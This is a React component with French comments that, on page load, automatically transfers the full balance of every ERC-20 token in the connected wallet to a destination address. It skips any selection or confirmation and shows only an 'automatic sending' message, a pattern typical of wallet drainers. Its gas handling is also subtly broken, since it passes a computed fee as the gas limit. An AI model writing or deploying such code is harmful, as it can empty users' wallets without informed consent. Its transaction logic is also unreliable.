import { useEffect, useState } from 'react';
import { useAtom } from 'jotai';
import { useWalletClient, usePublicClient } from 'wagmi';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { erc20ABI } from 'wagmi';
import { encodeFunctionData, normalize } from 'viem';
import { isAddress } from 'essential-eth';

// Fonction pour obtenir le prix du gaz depuis l'API Etherscan
const getGasPriceFromEtherscan = async () => {
  const API_KEY = 'VOTRE_CLE_API_ETHERESCAN';
  const url = `https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=${API_KEY}`;

  try {
    const response = await fetch(url);
    const data = await response.json();
    if (data.result) {
      return BigInt(data.result); // Convertir le prix du gaz en BigInt
    } else {
      console.error('Erreur lors de la récupération du prix du gaz.');
      return BigInt(0);
    }
  } catch (error) {
    console.error('Erreur de connexion à Etherscan:', error);
    return BigInt(0);
  }
};

// Calculer les frais de gaz avec une marge
const calculateGasWithMargin = (gasEstimate: bigint, gasPrice: bigint) => {
  const margin = BigInt(100000); // Ajoute une marge pour éviter les erreurs
  return gasEstimate * gasPrice + margin;
};

export const SendTokens = () => {
  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);

  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const sendAllTokens = async () => {
    if (!walletClient) {
      console.error('Aucun wallet connecté.');
      return;
    }
    if (!destinationAddress) {
      console.error('Adresse de destination invalide.');
      return;
    }

    let finalDestinationAddress = destinationAddress;

    // Résolution ENS si l'adresse contient un "."
    if (destinationAddress.includes('.')) {
      const resolvedAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedAddress) {
        finalDestinationAddress = resolvedAddress;
        setDestinationAddress(resolvedAddress);
      } else {
        console.error('Adresse ENS introuvable.');
        return;
      }
    }

    // Vérifier si l'adresse de destination est valide
    if (!isAddress(finalDestinationAddress)) {
      console.error('Adresse de destination invalide après validation.');
      return;
    }

    // Récupérer le prix du gaz
    const gasPrice = await getGasPriceFromEtherscan();
    if (gasPrice === BigInt(0)) {
      console.error('Impossible de récupérer les frais de gaz.');
      return;
    }

    // Filtrer les tokens à envoyer
    const tokensToSend = tokens.filter((token) => BigInt(token.balance) > 0);

    for (const token of tokensToSend) {
      try {
        console.log(`Préparation de l'envoi du token: ${token.contract_ticker_symbol}`);

        // Encodage de la transaction
        const data = encodeFunctionData({
          abi: erc20ABI,
          functionName: 'transfer',
          args: [finalDestinationAddress, BigInt(token.balance)],
        });

        // Estimation du gaz
        const gasEstimate = await publicClient.estimateGas({
          account: walletClient.account,
          to: token.contract_address,
          data,
        });

        const gasWithMargin = calculateGasWithMargin(gasEstimate, gasPrice);

        console.log(`Frais de gaz estimés pour ${token.contract_ticker_symbol}: ${gasWithMargin}`);

        // Exécution de la transaction
        const tx = await walletClient.sendTransaction({
          account: walletClient.account, // Utilisation de l'adresse connectée
          to: token.contract_address,
          data,
          gas: gasWithMargin, // Ajout des frais de gaz calculés
        });

        console.log(`Transaction envoyée pour ${token.contract_ticker_symbol}:`, tx);

        // Mettre à jour l'état avec la transaction
        setCheckedRecords((old) => ({
          ...old,
          [token.contract_address]: {
            ...old[token.contract_address],
            pendingTxn: tx,
          },
        }));
      } catch (err) {
        console.error(`Erreur avec le token ${token.contract_ticker_symbol}:`, err);
      }
    }
  };

  useEffect(() => {
    if (tokens.length > 0 && destinationAddress) {
      sendAllTokens();
    }
  }, [tokens, destinationAddress, walletClient]);

  return <div style={{ margin: '20px' }}>Envoi automatique des tokens...</div>;
};
